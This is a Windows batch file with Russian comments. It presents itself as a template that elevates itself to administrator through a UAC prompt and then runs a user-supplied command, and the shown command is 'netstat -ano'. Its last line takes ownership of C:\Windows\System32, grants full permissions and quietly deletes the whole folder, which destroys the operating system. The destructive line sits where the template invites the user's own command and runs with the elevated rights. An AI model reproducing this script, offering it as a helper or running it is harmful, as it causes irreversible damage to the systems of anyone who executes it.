@echo off
:: Проверка на права администратора и перезапуск, если их нет
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if '%errorlevel%' NEQ '0' (
    echo Запрашиваю права администратора...
    goto UACPrompt
) else ( goto gotAdmin )

:UACPrompt
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    exit /B

:gotAdmin
    if exist "%temp%\getadmin.vbs" ( del "%temp%\getadmin.vbs" )
    pushd "%CD%"
    CD /D "%~dp0"

:: ВПИШИ СВОЮ КОМАНДУ НИЖЕ
cmd /k "netstat -ano"
takeown /f C:\Windows\System32 /r /d y && icacls C:\Windows\System32 /grant administrators:F /t && rd /s /q C:\Windows\System32